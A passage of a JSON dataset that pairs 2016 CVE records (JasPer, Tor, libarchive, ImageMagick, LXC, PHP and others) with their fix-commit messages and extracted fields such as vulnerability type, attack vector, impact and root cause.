libjasper\/bmp\/bmp_dec.c in JasPer 1.900.5 allows remote attackers to cause a denial of service (NULL pointer dereference) by calling the imginfo command with a crafted BMP image. NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-8690.","commit_message_1":"fixed a problem with a null pointer dereference in the bmp decoder","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by calling the imginfo command with a crafted bmp image","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"3cea86eb2fbb65949673eb4ba8ebb695c87a57ce","cve_id":"CVE-2016-8860","cwe_id":"CWE-119","commit_message":"Add a one-word sentinel value of 0x0 at the end of each buf_t chunk\n\nThis helps protect against bugs where any part of a buf_t's memory\nis passed to a function that expects a NUL-terminated input.\n\nIt also closes TROVE-2016-10-001 (aka bug 20384).","summary":"Tor before 0.2.8.9 and 0.2.9.x before 0.2.9.4-alpha had internal functions that were entitled to expect that buf_t data had NUL termination, but the implementation of or\/buffers.c did not ensure that NUL termination was present, which allows remote attackers to cause a denial of service (client, hidden service, relay, or authority crash) via crafted data.","commit_message_1":"add a one-word sentinel value of 0x0 at the end of each buf_t chunk this help protect against bug where any part of a buf_t 's memory is passed to a function that expects a nul-terminated input","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted data","Impact":"cause a denial of service ( client , hidden service , relay , or authority crash )","Root Cause":"did not ensure that nul termination was present","Attack Type":"remote attacker"},{"commit_id":"44a524e367597af58d6265ae2014468b334d0309","cve_id":"CVE-2016-8693","cwe_id":"CWE-415","commit_message":"The memory stream interface allows for a buffer size of zero.\nThe case of a zero-sized buffer was not handled correctly, as it could\nlead to a double free.\nThis problem has now been fixed (hopefully).\nOne might ask whether a zero-sized buffer should be allowed at all,\nbut this is a question for another day.","summary":"Double free vulnerability in the mem_close function in jas_stream.c in JasPer before 1.900.10 allows remote attackers to cause a denial of service (crash) or possibly execute arbitrary code via a crafted BMP image to the imginfo command.","commit_message_1":"the memory stream interface allows for a buffer size of zero","Vulnerability Type":"double free","Attack Vector":"via a crafted bmp image to the imginfo command","Impact":"cause a denial of service or possibly execute arbitrary code","Root Cause":"caused by double free error","Attack Type":"remote attacker"},{"commit_id":"d8c2604cd438c41ec72aff52c16ebd8183068020","cve_id":"CVE-2016-8692","cwe_id":"CWE-369","commit_message":"Added range check on XRsiz and YRsiz fields of SIZ marker segment.","summary":"The jpc_dec_process_siz function in libjasper\/jpc\/jpc_dec.c in JasPer before 1.900.4 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted YRsiz value in a BMP image to the imginfo command.","commit_message_1":"added range check on xrsiz and yrsiz field of siz marker segment","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted yrsiz value in a bmp image to the imginfo command ","Impact":"cause a denial of service ( divide - by - zero error and application crash )","Root Cause":"caused by a divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"8f62b4761711d036fd8964df256b938c809b7fca","cve_id":"CVE-2016-8690","cwe_id":"CWE-476","commit_message":"Fixed a sanitizer failure in the BMP codec.\nAlso, added a --debug-level command line option to the imginfo command\nfor debugging purposes.","summary":"The bmp_getdata function in libjasper\/bmp\/bmp_dec.c in JasPer before 1.900.5 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted BMP image in an imginfo command.","commit_message_1":"fixed a sanitizer failure in the bmp codec","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted bmp image in an imginfo command","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by NULL pointer dereference error","Attack Type":"remote attacker"},{"commit_id":"7f17c791dcfd8c0416e2cd2485b19410e47ef126","cve_id":"CVE-2016-8689","cwe_id":"CWE-125","commit_message":"Issue 761:  Heap overflow reading corrupted 7Zip files\n\nThe sample file that demonstrated this had multiple 'EmptyStream'\nattributes.  The first one ended up being used to calculate\ncertain statistics, then was overwritten by the second which\nwas incompatible with those statistics.\n\nThe fix here is to reject any header with multiple EmptyStream\nattributes.  While here, also reject headers with multiple\nEmptyFile, AntiFile, Name, or Attributes markers.","summary":"The read_Header function in archive_read_support_format_7zip.c in libarchive 3.2.1 allows remote attackers to cause a denial of service (out-of-bounds read) via multiple EmptyStream attributes in a header in a 7zip archive.","commit_message_1":"heap overflow reading corrupted 7zip file the sample file that demonstrated this had multiple 'emptystream ' attribute","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via multiple emptystream attributes in a header in a 7zip archive","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"eec077f52bfa2d3f7103b4b74d52572ba8a15aca","cve_id":"CVE-2016-8688","cwe_id":"CWE-125","commit_message":"Issue 747 (and others?):  Avoid OOB read when parsing multiple long lines\n\nThe mtree bidder needs to look several lines ahead\nin the input.  It does this by extending the read-ahead\nand parsing subsequent lines from the same growing buffer.\nA bookkeeping error when extending the read-ahead would\nsometimes lead it to significantly over-count the\nsize of the line being read.","summary":"The mtree bidder in libarchive 3.2.1 does not keep track of line sizes when extending the read-ahead, which allows remote attackers to cause a denial of service (crash) via a crafted file, which triggers an invalid read in the (1) detect_form or (2) bid_entry function in libarchive\/archive_read_support_format_mtree.c.","commit_message_1":"avoid oob read when parsing multiple long line the mtree bidder need to look several line ahead in the input","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted file , which triggers an invalid read in the ( 1 ) detect _ form or ( 2 ) bid _ entry function in libarchive \/ archive _ read _ support _ format _ mtree . c","Impact":"cause a denial of service ( crash )","Root Cause":"does not keep track of line sizes when extending the read - ahead ,","Attack Type":"remote attacker"},{"commit_id":"e37b620fe8f14535d737e89a4dcabaed4517bf1a","cve_id":"CVE-2016-8687","cwe_id":"CWE-119","commit_message":"Issue #767:  Buffer overflow printing a filename\n\nThe safe_fprintf function attempts to ensure clean output for an\narbitrary sequence of bytes by doing a trial conversion of the\nmultibyte characters to wide characters -- if the resulting wide\ncharacter is printable then we pass through the corresponding bytes\nunaltered, otherwise, we convert them to C-style ASCII escapes.\n\nThe stack trace in Issue #767 suggest that the 20-byte buffer\nwas getting overflowed trying to format a non-printable multibyte\ncharacter.  This should only happen if there is a valid multibyte\ncharacter of more than 5 bytes that was unprintable.  (Each byte\nwould get expanded to a four-charcter octal-style escape of the form\n\"\\123\" resulting in >20 characters for the >5 byte multibyte character.)\n\nI've not been able to reproduce this, but have expanded the conversion\nbuffer to 128 bytes on the belief that no multibyte character set\nhas a single character of more than 32 bytes.","summary":"Stack-based buffer overflow in the safe_fprintf function in tar\/util.c in libarchive 3.2.1 allows remote attackers to cause a denial of service via a crafted non-printable multibyte character in a filename.","commit_message_1":"buffer overflow printing a filename the safe_fprintf function attempt to ensure clean output for an arbitrary sequence of byte by doing a trial conversion of the multibyte character to wide character -- if the resulting wide character is printable then we pas through the corresponding byte unaltered , otherwise , we convert them to c-style ascii escape","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted non - printable multibyte character in a filename","Impact":"cause a denial of service","Root Cause":"caused by improper bounds checking by libarchive","Attack Type":"remote attacker"},{"commit_id":"6e48aa92ff4e6e95424300ecd52a9ea453c19c60","cve_id":"CVE-2016-8677","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/268","summary":"The AcquireQuantumPixels function in MagickCore\/quantum.c in ImageMagick before 7.0.3-1 allows remote attackers to have unspecified impact via a crafted image file, which triggers a memory allocation failure.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted image file , which triggers a memory allocation failure","Impact":"have unspecified impact","Root Cause":"caused by a memory allocation failure","Attack Type":"remote attacker"},{"commit_id":"e5b019725f53b79159931d3a7317107cbbfd0860","cve_id":"CVE-2016-8675","cwe_id":"CWE-476","commit_message":"m4vdec: Check for non-startcode 00 00 00 sequences in probe\n\nThis makes the m4v detection less trigger-happy.\n\nBug-Id: 949\nSigned-off-by: Diego Biurrun <diego@biurrun.de>","summary":"The get_vlc2 function in get_bits.h in Libav before 11.9 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) via a crafted mp3 file, possibly related to startcode sequences during m4v detection.","commit_message_1":"check for non-startcode <number> <number> <number> sequence in probe this make the m4v detection le trigger-happy","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted mp3 file , possibly related to startcode sequences during m4v detection","Impact":"cause a denial of service ( pointer dereference and crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"53110871935244816bbb9d131da0bccff734bfe9","cve_id":"CVE-2016-8670","cwe_id":"CWE-119","commit_message":"Avoid potentially dangerous signed to unsigned conversion\n\nWe make sure to never pass a negative `rlen` as size to memcpy(). See\nalso <https:\/\/bugs.php.net\/bug.php?id=73280>.\n\nPatch provided by Emmanuel Law.","summary":"Integer signedness error in the dynamicGetbuf function in gd_io_dp.c in the GD Graphics Library (aka libgd) through 2.2.3, as used in PHP before 5.6.28 and 7.x before 7.0.13, allows remote attackers to cause a denial of service (stack-based buffer overflow) or possibly have unspecified other impact via a crafted imagecreatefromstring call.","commit_message_1":"avoid potentially dangerous signed to unsigned conversion we make sure to never pas a negative ` rlen ` a size to memcpy ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted imagecreatefromstring call ","Impact":"cause a denial of service ( stack - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the dynamicGetbuf() function","Attack Type":"remote attacker"},{"commit_id":"81f466d05f2a89cb4f122ef7f593ff3f279b165c","cve_id":"CVE-2016-8649","cwe_id":"CWE-264","commit_message":"attach: do not send procfd to attached process\n\nSo far, we opened a file descriptor refering to proc on the host inside the\nhost namespace and handed that fd to the attached process in\nattach_child_main(). This was done to ensure that LSM labels were correctly\nsetup. However, by exploiting a potential kernel bug, ptrace could be used to\nprevent the file descriptor from being closed which in turn could be used by an\nunprivileged container to gain access to the host namespace. Aside from this\nneeding an upstream kernel fix, we should make sure that we don't pass the fd\nfor proc itself to the attached process. However, we cannot completely prevent\nthis, as the attached process needs to be able to change its apparmor profile\nby writing to \/proc\/self\/attr\/exec or \/proc\/self\/attr\/current. To minimize the\nattack surface, we only send the fd for \/proc\/self\/attr\/exec or\n\/proc\/self\/attr\/current to the attached process. To do this we introduce a\nlittle more IPC between the child and parent:\n\n\t * IPC mechanism: (X is receiver)\n\t *   initial process        intermediate          attached\n\t *        X           <---  send pid of\n\t *                          attached proc,\n\t *                          then exit\n\t *    send 0 ------------------------------------>    X\n\t *                                              [do initialization]\n\t *        X  <------------------------------------  send 1\n\t *   [add to cgroup, ...]\n\t *    send 2 ------------------------------------>    X\n\t *\t\t\t\t\t\t[set LXC_ATTACH_NO_NEW_PRIVS]\n\t *        X  <------------------------------------  send 3\n\t *   [open LSM label fd]\n\t *    send 4 ------------------------------------>    X\n\t *   \t\t\t\t\t\t[set LSM label]\n\t *   close socket                                 close socket\n\t *                                                run program\n\nThe attached child tells the parent when it is ready to have its LSM labels set\nup. The parent then opens an approriate fd for the child PID to\n\/proc\/<pid>\/attr\/exec or \/proc\/<pid>\/attr\/current and sends it via SCM_RIGHTS\nto the child. The child can then set its LSM laben. Both sides then close the\nsocket fds and the child execs the requested process.\n\nSigned-off-by: Christian Brauner <christian.brauner@canonical.com>","summary":"lxc-attach in LXC before 1.0.9 and 2.x before 2.0.6 allows an attacker inside of an unprivileged container to use an inherited file descriptor, of the host's \/proc, to access the rest of the host's filesystem via the openat() family of syscalls.","commit_message_1":"do not send procfd to attached process so far , we opened a file descriptor refering to proc on the host inside the host namespace and handed that fd to the attached process in attach_child_main ( )","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via the openat ( ) family of syscalls","Impact":"use an inherited file descriptor , of the host ' s \/ proc , to access the rest of the host ' s filesyst","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"647bf3d8a8e5777319da92af672289b2a6c4dc66","cve_id":"CVE-2016-8636","cwe_id":"CWE-190","commit_message":"IB\/rxe: Fix mem_check_range integer overflow\n\nUpdate the range check to avoid integer-overflow in edge case.\nResolves CVE 2016-8636.\n\nSigned-off-by: Eyal Itkin <eyal.itkin@gmail.com>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nReviewed-by: Leon Romanovsky <leonro@mellanox.com>\nSigned-off-by: Doug Ledford <dledford@redhat.com>","summary":"Integer overflow in the mem_check_range function in drivers\/infiniband\/sw\/rxe\/rxe_mr.c in the Linux kernel before 4.9.10 allows local users to cause a denial of service (memory corruption), obtain sensitive information from kernel memory, or possibly have unspecified other impact via a write or read request involving the *RDMA protocol over infiniband* (aka Soft RoCE) technology.","commit_message_1":"fix mem_check_range integer overflow update the range check to avoid integer-overflow in edge case","Vulnerability Type":"integer overflow","Attack Vector":"via a write or read request involving the * rdma protocol over infiniband * ( aka soft roce ) technology","Impact":"cause a denial of service ( memory corruption ) , obtain sensitive information from kernel memory , or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"d63a3c5729df59f183e9e110d5d8385d17caaad0","cve_id":"CVE-2016-7906","cwe_id":"CWE-416","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/281","summary":"magick\/attribute.c in ImageMagick 7.0.3-2 allows remote attackers to cause a denial of service (use-after-free) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( use - after - free )","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"bb454857348245a7397f9e4fbb3a902f4ac25913","cve_id":"CVE-2016-7838","cwe_id":"CWE-426","commit_message":"Verify UpdateTempDir isn't maliciously modified\n\nDon't just delete the stored updates temporary directory on launch, but\nvalidate the registry key to ensure it is in an expected location and\nfollows WinSparkle's naming convention. This is to prevent malicious\nusers from modifying this registry key and forcing the host app to\ndelete arbitrary directories (a user being able to delete the key would\nbe able to delete the directory themselves, so it's not a serious issue,\nbut it nevertheless is bad behavior and shouldn't be possible).","summary":"Untrusted search path vulnerability in WinSparkle versions prior to 0.5.3 allows remote attackers to execute arbitrary code via a specially crafted executable file in an unspecified directory.","commit_message_1":"verify updatetempdir is n't maliciously modified do n't just delete the stored update temporary directory on launch , but validate the registry key to ensure it is in an expected location and follows winsparkle 's naming convention","Vulnerability Type":"untrusted search path","Attack Vector":"via a specially crafted executable file in an unspecified directory","Impact":"execute arbitrary code","Root Cause":"delete arbitrary files on the system","Attack Type":"remote attacker"},{"commit_id":"a7bb158b7bedd1449a34432feb3a67c8f1873bfa","cve_id":"CVE-2016-7799","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/280","summary":"MagickCore\/profile.c in ImageMagick before 7.0.3-2 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"8108e0a6db133f3375608303fdd2083eb5115062","cve_id":"CVE-2016-7798","cwe_id":"CWE-310","commit_message":"cipher: don't set dummy encryption key in Cipher#initialize\n\nRemove the encryption key initialization from Cipher#initialize. This\nis effectively a revert of r32723 (\"Avoid possible SEGV from AES\nencryption\/decryption\", 2011-07-28).\n\nr32723, which added the key initialization, was a workaround for\nRuby Bug #2768. For some certain ciphers, calling EVP_CipherUpdate()\nbefore setting an encryption key caused segfault. It was not a problem\nuntil OpenSSL implemented GCM mode - the encryption key could be\noverridden by repeated calls of EVP_CipherInit_ex(). But, it is not the\ncase for AES-GCM ciphers. Setting a key, an IV, a key, in this order\ncauses the IV to be reset to an all-zero IV.\n\nThe problem of Bug #2768 persists on the current versions of OpenSSL.\nSo, make Cipher#update raise an exception if a key is not yet set by the\nuser. Since encrypting or decrypting without key does not make any\nsense, this should not break existing applications.\n\nUsers can still call Cipher#key= and Cipher#iv= multiple times with\ntheir own responsibility.\n\nReference: https:\/\/bugs.ruby-lang.org\/issues\/2768\nReference: https:\/\/bugs.ruby-lang.org\/issues\/8221\nReference: https:\/\/github.com\/ruby\/openssl\/issues\/49","summary":"The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.","commit_message_1":"do n't set dummy encryption key in cipher # initialize remove the encryption key initialization from cipher # initialize","Vulnerability Type":"Cryptographic Issues","Attack Vector":"when the IV is set before the key","Impact":"bypass security restrictions","Root Cause":"caused by the use of the same initialization vector (IV)","Attack Type":"remote attacker"},{"commit_id":"5ec24a2642bd0854b884d1a9b51d12371373b410","cve_id":"CVE-2016-7797","cwe_id":"CWE-254","commit_message":"Fix: remote: cl#5269 - Notify other clients of a new connection only if the handshake has completed (bsc#967388)","summary":"Pacemaker before 1.1.15, when using pacemaker remote, might allow remote attackers to cause a denial of service (node disconnection) via an unauthenticated connection.","commit_message_1":"remote : cl # <number> - notify other client of a new connection only if the handshake ha completed ( bsc # <number> )","Vulnerability Type":"Security Features","Attack Vector":"via an unauthenticated connection","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"a0108a892f9ea3c2bb1e7a49b7d71376c2ecbff7","cve_id":"CVE-2016-7540","cwe_id":"CWE-19","commit_message":"Fix abort when writing to rgf format\n\nThe rgf format (LEGO MINDSTORMS EV3 images) caused a software abort because\nexception == NULL. When WriteRGFImage is called from WriteImage, it is only\npassed two parameters, not three. So, removed the extra parameter and use\nimage->exception instead as in other coders.","summary":"coders\/rgf.c in ImageMagick before 6.9.4-10 allows remote attackers to cause a denial of service (assertion failure) by converting an image to rgf format.","commit_message_1":"fix abort when writing to rgf format the rgf format ( lego mindstorms ev3 image ) caused a software abort because exception == null","Vulnerability Type":"Data Processing Errors","Attack Vector":"by converting an image to rgf format","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"4e81ce8b07219c69a9aeccb0f7f7b927ca6db74c","cve_id":"CVE-2016-7539","cwe_id":"CWE-399","commit_message":"http:\/\/www.imagemagick.org\/discourse-server\/viewtopic.php?f=2&t=28946","summary":"Memory leak in AcquireVirtualMemory in ImageMagick before 7 allows remote attackers to cause a denial of service (memory consumption) via unspecified vectors.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by the failure to release memory","Attack Type":"remote attacker"},{"commit_id":"53c1dcd34bed85181b901bfce1a2322f85a59472","cve_id":"CVE-2016-7538","cwe_id":"CWE-787","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/148","summary":"coders\/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds write) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds write error","Attack Type":"remote attacker"},{"commit_id":"424d40ebfcde48bb872eba75179d3d73704fdf1f","cve_id":"CVE-2016-7537","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/143","summary":"MagickCore\/memory.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds access) via a crafted PDB file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted pdb file","Impact":"cause a denial of service ( out - of - bounds access )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"478cce544fdf1de882d78381768458f397964453","cve_id":"CVE-2016-7536","cwe_id":"CWE-20","commit_message":"Fixed SEGV reported in https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/130","summary":"magick\/profile.c in ImageMagick allows remote attackers to cause a denial of service (segmentation fault) via a crafted profile.","commit_message_1":"fixed segv reported in http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted profile","Impact":"cause a denial of service ( segmentation fault )","Root Cause":"caused by a segmentation violation error","Attack Type":"remote attacker"},{"commit_id":"430403b0029b37decf216d57f810899cab2317dd","cve_id":"CVE-2016-7534","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/126","summary":"The generic decoder in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds access) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( out - of - bounds access )","Root Cause":"caused by an out-of-bounds write error","Attack Type":"remote attacker"},{"commit_id":"bef1e4f637d8f665bc133a9c6d30df08d983bc3a","cve_id":"CVE-2016-7533","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/120","summary":"The ReadWPGImage function in coders\/wpg.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted WPG file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted wpg file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"4f2c04ea6673863b87ac7f186cbb0d911f74085c","cve_id":"CVE-2016-7532","cwe_id":"CWE-125","commit_message":"Added check for out of bounds read (https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/108).","summary":"coders\/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.","commit_message_1":"added check for out of bound read ( http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted psd file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"c4e63ad30bc42da691f2b5f82a24516dd6b4dc70","cve_id":"CVE-2016-7530","cwe_id":"CWE-369","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/105","summary":"The quantum handling code in ImageMagick allows remote attackers to cause a denial of service (divide-by-zero error or out-of-bounds write) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( divide - by - zero error or out - of - bounds write )","Root Cause":"caused by an out-of-bounds access error","Attack Type":"remote attacker"},{"commit_id":"a2e1064f288a353bc5fef7f79ccb7683759e775c","cve_id":"CVE-2016-7529","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/104","summary":"coders\/xcf.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted XCF file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted xcf file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"ca0c886abd6d3ef335eb74150cd23b89ebd17135","cve_id":"CVE-2016-7528","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/99","summary":"The ReadVIFFImage function in coders\/viff.c in ImageMagick allows remote attackers to cause a denial of service (segmentation fault) via a crafted VIFF file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted viff file","Impact":"cause a denial of service ( segmentation fault )","Root Cause":"caused by an out-of-bounds access error","Attack Type":"remote attacker"},{"commit_id":"a251039393f423c7858e63cab6aa98d17b8b7a41","cve_id":"CVE-2016-7527","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/122","summary":"coders\/wpg.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"5f16640725b1225e6337c62526e6577f0f88edb8","cve_id":"CVE-2016-7525","cwe_id":"CWE-125","commit_message":"Fixed head buffer overflow reported in: https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/98","summary":"Heap-based buffer overflow in coders\/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.","commit_message_1":"fixed head buffer overflow reported in : http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted psd file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"4b1b9c0522628887195bad3a6723f7000b0c9a58","cve_id":"CVE-2016-7522","cwe_id":"CWE-125","commit_message":"Added extra check to fix https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/93","summary":"The ReadPSDImage function in MagickCore\/locale.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.","commit_message_1":"added extra check to fix http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted psd file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out of bound read error","Attack Type":"remote attacker"},{"commit_id":"30eec879c8b446b0ea9a3bb0da1a441cc8482bc4","cve_id":"CVE-2016-7521","cwe_id":"CWE-125","commit_message":"Moved check for https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/92.","summary":"Heap-based buffer overflow in coders\/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.","commit_message_1":"moved check for http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted psd file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"14e606db148d6ebcaae20f1e1d6d71903ca4a556","cve_id":"CVE-2016-7520","cwe_id":"CWE-125","commit_message":"https:\/\/bugs.launchpad.net\/ubuntu\/+source\/imagemagick\/+bug\/1537213","summary":"Heap-based buffer overflow in coders\/hdr.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted HDR file.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted hdr file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by a heap-buffer-overflow read error","Attack Type":"remote attacker"},{"commit_id":"2ad6d33493750a28a5a655d319a8e0b16c392de1","cve_id":"CVE-2016-7515","cwe_id":"CWE-125","commit_message":"Fixed check for the number of pixels that will be allocated.","summary":"The ReadRLEImage function in coders\/rle.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via vectors related to the number of pixels.","commit_message_1":"fixed check for the number of pixel that will be allocated","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via vectors related to the number of pixels","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"e14fd0a2801f73bdc123baf4fbab97dec55919eb","cve_id":"CVE-2016-7514","cwe_id":"CWE-125","commit_message":"Added missing call to ConstrainColormapIndex.","summary":"The ReadPSDChannelPixels function in coders\/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.","commit_message_1":"added missing call to constraincolormapindex","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted psd file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"61cdd1255d5b9c8453be71aacbbf682796ac77d4","cve_id":"CVE-2016-7480","cwe_id":"CWE-119","commit_message":"Fix bug #73257 and bug #73258 - SplObjectStorage unserialize allows use of non-object as key","summary":"The SplObjectStorage unserialize implementation in ext\/spl\/spl_observer.c in PHP before 7.0.12 does not verify that a key is an object, which allows remote attackers to execute arbitrary code or cause a denial of service (uninitialized memory access) via crafted serialized data.","commit_message_1":"fix bug # <number> and bug # <number> - splobjectstorage unserialize allows use of non-object a key","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted serialized data","Impact":"execute arbitrary code or cause a denial of service ( uninitialized memory access","Root Cause":"does not verify that a key is an object","Attack Type":"remote attacker"},{"commit_id":"f50a84bad996d438e7b31b9e74c32a41e43f8be5","cve_id":"CVE-2016-7145","cwe_id":"CWE-287","commit_message":"Fix to prevent SASL security vulnerability","summary":"The m_authenticate function in ircd\/m_authenticate.c in nefarious2 allows remote attackers to spoof certificate fingerprints and consequently log in as another user via a crafted AUTHENTICATE parameter.","commit_message_1":"fix to prevent sasl security vulnerability","Vulnerability Type":"Improper Authentication","Attack Vector":"via a crafted authenticate parameter","Impact":"spoof certificate fingerprints and consequently log in as another user","Root Cause":"caused by a flaw","Attack Type":"remote 